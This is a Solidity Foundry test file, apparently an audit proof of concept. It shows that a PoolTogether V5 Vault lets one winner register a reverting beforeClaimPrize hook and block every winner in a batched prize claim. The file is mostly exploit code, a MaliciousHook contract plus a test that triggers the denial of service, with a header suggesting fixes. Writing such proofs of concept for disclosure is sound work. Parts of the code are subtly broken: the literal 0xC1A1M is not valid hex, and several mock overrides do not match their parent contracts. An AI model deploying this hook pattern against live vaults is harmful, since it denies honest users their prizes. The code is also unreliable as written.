// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

/*
  Foundry PoC for PoolTogether V5 Vault hook DoS vulnerability.

  The test shows that a winner can register a malicious hook contract that
  reverts in `beforeClaimPrize`.  Because the Vault blindly executes the
  external call for **every** winner inside a single `claimPrizes`
  transaction, a single reverting hook bricks the whole claim and prevents
  other honest winners from receiving their prize (denial-of-service).

  Fix: Vault should execute hooks using `try/catch`, apply per-winner
  isolation, or add strict allow-lists for hook contracts.
*/

import "forge-std/Test.sol";
import { ERC20 } from "openzeppelin/token/ERC20/ERC20.sol";
import { ERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
import { Vault }  from "../../src/Vault.sol";
import { VaultHooks } from "../../src/interfaces/IVaultHooks.sol";
import { PrizePool } from "v5-prize-pool/PrizePool.sol";
import { TwabController } from "v5-twab-controller/TwabController.sol";
import { IERC20 } from "openzeppelin/token/ERC20/IERC20.sol";

/* -------------------------------------------------------------------------- */
/*                                  Mock ERC20                                */
/* -------------------------------------------------------------------------- */
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) {
        _setupDecimals(d);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // OZ’s ERC20 uses 18 decimals by default; we expose setter for different decimals.
    uint8 private _decimals;

    function _setupDecimals(uint8 d) internal {
        _decimals = d;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}

/* -------------------------------------------------------------------------- */
/*                           Minimal TwabController                            */
/* -------------------------------------------------------------------------- */
contract MockTwabController is TwabController {
    // storage: vault -> account -> balance
    mapping(address => mapping(address => uint96)) internal _balance;
    mapping(address => uint96) internal _totalSupply;

    address public constant SPONSORSHIP_ADDRESS = address(0xdead);

    /* ----------------------------- view helpers --------------------------- */
    function balanceOf(address /*vault*/, address account) external view returns (uint256) {
        return _balance[msg.sender][account];
    }

    function totalSupply(address /*vault*/) external view returns (uint256) {
        return _totalSupply[msg.sender];
    }

    function delegateOf(address /*vault*/, address /*account*/) external pure returns (address) {
        return SPONSORSHIP_ADDRESS;
    }

    /* ---------------------------- state changers ------------------------- */
    function mint(address to, uint96 amount) external {
        _balance[msg.sender][to] += amount;
        _totalSupply[msg.sender] += amount;
    }

    function burn(address from, uint96 amount) external {
        _balance[msg.sender][from] -= amount;
        _totalSupply[msg.sender] -= amount;
    }

    function transfer(address from, address to, uint96 amount) external {
        _balance[msg.sender][from] -= amount;
        _balance[msg.sender][to] += amount;
    }

    function sponsor(address /*account*/) external {}
}

/* -------------------------------------------------------------------------- */
/*                             Minimal Yield Vault                            */
/* -------------------------------------------------------------------------- */
contract DummyYieldVault is ERC4626 {
    constructor(IERC20 asset_) ERC20("YVault", "YV") ERC4626(asset_) {}

    // We do not need correct accounting; Vault paths we exercise never call deposit/withdraw.
    function _deposit(address, uint256, address) internal pure override returns (uint256) {
        return 0;
    }

    function _withdraw(address, address, address, uint256, uint256) internal pure override {}

    function maxWithdraw(address) public pure override returns (uint256) {
        return 0;
    }
}

/* -------------------------------------------------------------------------- */
/*                              Mock Prize Pool                               */
/* -------------------------------------------------------------------------- */
contract MockPrizePool {
    IERC20 internal immutable _prizeToken;

    constructor(IERC20 prizeToken_) {
        _prizeToken = prizeToken_;
    }

    function prizeToken() external view returns (IERC20) {
        return _prizeToken;
    }

    // Just return 100 for every prize claim
    function claimPrize(
        address,
        uint8,
        uint32,
        address,
        uint96,
        address
    ) external returns (uint256) {
        return 100;
    }

    // Required by Vault but never used in this PoC
    function contributePrizeTokens(address, uint256) external {}
}

/* -------------------------------------------------------------------------- */
/*                         Malicious Hook Implementation                      */
/* -------------------------------------------------------------------------- */
interface IHook {
    function beforeClaimPrize(address, uint8, uint32) external returns (address);
    function afterClaimPrize(address, uint8, uint32, uint256, address) external;
}

contract MaliciousHook is IHook {
    // Always revert – causes DoS
    function beforeClaimPrize(
        address,
        uint8,
        uint32
    ) external pure override returns (address) {
        revert("Malicious revert");
    }

    function afterClaimPrize(
        address,
        uint8,
        uint32,
        uint256,
        address
    ) external pure override {}
}

/* -------------------------------------------------------------------------- */
/*                                   Tests                                    */
/* -------------------------------------------------------------------------- */
contract VaultHookExploitTest is Test {
    MockERC20           internal asset;
    MockERC20           internal prizeToken;
    Vault               internal vault;
    MockTwabController  internal twab;
    DummyYieldVault     internal yVault;
    MockPrizePool       internal prizePool;

    address internal owner   = address(0xA11CE);
    address internal claimer = address(0xC1A1M);
    address internal alice   = address(0xB0B);
    address internal bob     = address(0xB0B1);
    address internal feeRecipient = address(0xFEE);

    function setUp() public {
        // Deploy mocks
        asset      = new MockERC20("Asset", "AST", 18);
        prizeToken = new MockERC20("Prize", "PRZ", 18);

        twab      = new MockTwabController();
        yVault    = new DummyYieldVault(asset);
        prizePool = new MockPrizePool(prizeToken);

        // Deploy Vault
        vault = new Vault(
            IERC20(asset),
            "VaultShare",
            "vSHARE",
            TwabController(address(twab)),
            yVault,
            PrizePool(address(prizePool)),
            claimer,
            owner,              // yield fee recipient – unused
            0,                  // yield fee percentage – unused
            owner
        );
    }

    /* ---------------------------------------------------------------------- */
    /*  Exploit: Alice registers a reverting hook – any claim including her   */
    /*  fails, blocking Bob (or anyone else) from receiving their prize.      */
    /* ---------------------------------------------------------------------- */
    function testDOSViaMaliciousBeforeClaimHook() public {
        // Deploy malicious hook
        MaliciousHook evil = new MaliciousHook();

        // Build hooks struct
        VaultHooks memory hooks;
        hooks.useBeforeClaimPrize = true;
        hooks.useAfterClaimPrize  = false;
        hooks.implementation      = IHook(address(evil));

        // Alice sets her malicious hooks
        vm.prank(alice);
        vault.setHooks(hooks);

        // Claimer attempts to claim prizes for Alice AND Bob
        address[] memory winners = new address[](2);
        winners[0] = alice;
        winners[1] = bob;

        uint32[][] memory prizeIdx = new uint32[][](2);
        prizeIdx[0] = new uint32[](1);
        prizeIdx[0][0] = 0;

        prizeIdx[1] = new uint32[](1);
        prizeIdx[1][0] = 0;

        vm.prank(claimer);
        vm.expectRevert(bytes("Malicious revert"));
        vault.claimPrizes(
            0,              // tier
            winners,
            prizeIdx,
            0,              // fee per claim
            feeRecipient
        );
    }

    /* ---------------------------------------------------------------------- */
    /*            Control test – Bob alone can claim successfully             */
    /* ---------------------------------------------------------------------- */
    function testClaimSucceedsWithoutMaliciousHook() public {
        address[] memory winners = new address[](1);
        winners[0] = bob;

        uint32[][] memory prizeIdx = new uint32[][](1);
        prizeIdx[0] = new uint32[](1);
        prizeIdx[0][0] = 0;

        vm.prank(claimer);
        uint256 totalPrizes = vault.claimPrizes(
            0,
            winners,
            prizeIdx,
            0,
            feeRecipient
        );

        assertEq(totalPrizes, 100);
    }
}